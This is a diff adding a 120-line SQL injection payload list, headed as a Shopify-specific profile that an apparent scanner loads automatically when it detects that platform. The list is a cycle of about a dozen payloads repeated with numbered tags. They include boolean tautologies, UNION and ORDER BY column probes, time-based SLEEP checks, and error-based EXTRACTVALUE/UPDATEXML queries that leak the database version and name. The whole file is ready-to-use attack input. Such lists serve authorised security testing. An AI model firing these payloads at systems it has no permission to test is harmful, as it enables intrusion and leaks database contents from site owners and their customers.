@@ -1,0 +1,122 @@
+# shopify CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Shopify
+' OR '1'='1' /*shopify_1*/
+' AND 1=2 UNION SELECT NULL-- shopify_2
+' AND SLEEP(4)-- shopify_3
+' OR IF(4=4,SLEEP(2),0)-- shopify_4
+' UNION SELECT NULL,NULL,NULL-- shopify_5
+' ORDER BY 7-- shopify_6
+' GROUP BY 8 HAVING 1=1-- shopify_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_9
+1 OR 1=1# shopify_10
+-1 UNION SELECT NULL-- shopify_11
+' OR 1=1-- shopify_12
+' OR '1'='1' /*shopify_13*/
+' AND 1=2 UNION SELECT NULL-- shopify_14
+' AND SLEEP(1)-- shopify_15
+' OR IF(16=16,SLEEP(2),0)-- shopify_16
+' UNION SELECT NULL,NULL,NULL-- shopify_17
+' ORDER BY 9-- shopify_18
+' GROUP BY 4 HAVING 1=1-- shopify_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_21
+1 OR 1=1# shopify_22
+-1 UNION SELECT NULL-- shopify_23
+' OR 1=1-- shopify_24
+' OR '1'='1' /*shopify_25*/
+' AND 1=2 UNION SELECT NULL-- shopify_26
+' AND SLEEP(3)-- shopify_27
+' OR IF(28=28,SLEEP(2),0)-- shopify_28
+' UNION SELECT NULL,NULL,NULL-- shopify_29
+' ORDER BY 1-- shopify_30
+' GROUP BY 8 HAVING 1=1-- shopify_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_33
+1 OR 1=1# shopify_34
+-1 UNION SELECT NULL-- shopify_35
+' OR 1=1-- shopify_36
+' OR '1'='1' /*shopify_37*/
+' AND 1=2 UNION SELECT NULL-- shopify_38
+' AND SLEEP(5)-- shopify_39
+' OR IF(40=40,SLEEP(2),0)-- shopify_40
+' UNION SELECT NULL,NULL,NULL-- shopify_41
+' ORDER BY 3-- shopify_42
+' GROUP BY 4 HAVING 1=1-- shopify_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_45
+1 OR 1=1# shopify_46
+-1 UNION SELECT NULL-- shopify_47
+' OR 1=1-- shopify_48
+' OR '1'='1' /*shopify_49*/
+' AND 1=2 UNION SELECT NULL-- shopify_50
+' AND SLEEP(2)-- shopify_51
+' OR IF(52=52,SLEEP(2),0)-- shopify_52
+' UNION SELECT NULL,NULL,NULL-- shopify_53
+' ORDER BY 5-- shopify_54
+' GROUP BY 8 HAVING 1=1-- shopify_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_57
+1 OR 1=1# shopify_58
+-1 UNION SELECT NULL-- shopify_59
+' OR 1=1-- shopify_60
+' OR '1'='1' /*shopify_61*/
+' AND 1=2 UNION SELECT NULL-- shopify_62
+' AND SLEEP(4)-- shopify_63
+' OR IF(64=64,SLEEP(2),0)-- shopify_64
+' UNION SELECT NULL,NULL,NULL-- shopify_65
+' ORDER BY 7-- shopify_66
+' GROUP BY 4 HAVING 1=1-- shopify_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_69
+1 OR 1=1# shopify_70
+-1 UNION SELECT NULL-- shopify_71
+' OR 1=1-- shopify_72
+' OR '1'='1' /*shopify_73*/
+' AND 1=2 UNION SELECT NULL-- shopify_74
+' AND SLEEP(1)-- shopify_75
+' OR IF(76=76,SLEEP(2),0)-- shopify_76
+' UNION SELECT NULL,NULL,NULL-- shopify_77
+' ORDER BY 9-- shopify_78
+' GROUP BY 8 HAVING 1=1-- shopify_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_81
+1 OR 1=1# shopify_82
+-1 UNION SELECT NULL-- shopify_83
+' OR 1=1-- shopify_84
+' OR '1'='1' /*shopify_85*/
+' AND 1=2 UNION SELECT NULL-- shopify_86
+' AND SLEEP(3)-- shopify_87
+' OR IF(88=88,SLEEP(2),0)-- shopify_88
+' UNION SELECT NULL,NULL,NULL-- shopify_89
+' ORDER BY 1-- shopify_90
+' GROUP BY 4 HAVING 1=1-- shopify_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_93
+1 OR 1=1# shopify_94
+-1 UNION SELECT NULL-- shopify_95
+' OR 1=1-- shopify_96
+' OR '1'='1' /*shopify_97*/
+' AND 1=2 UNION SELECT NULL-- shopify_98
+' AND SLEEP(5)-- shopify_99
+' OR IF(100=100,SLEEP(2),0)-- shopify_100
+' UNION SELECT NULL,NULL,NULL-- shopify_101
+' ORDER BY 3-- shopify_102
+' GROUP BY 8 HAVING 1=1-- shopify_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_105
+1 OR 1=1# shopify_106
+-1 UNION SELECT NULL-- shopify_107
+' OR 1=1-- shopify_108
+' OR '1'='1' /*shopify_109*/
+' AND 1=2 UNION SELECT NULL-- shopify_110
+' AND SLEEP(2)-- shopify_111
+' OR IF(112=112,SLEEP(2),0)-- shopify_112
+' UNION SELECT NULL,NULL,NULL-- shopify_113
+' ORDER BY 5-- shopify_114
+' GROUP BY 4 HAVING 1=1-- shopify_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- shopify_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- shopify_117
+1 OR 1=1# shopify_118
+-1 UNION SELECT NULL-- shopify_119
+' OR 1=1-- shopify_120
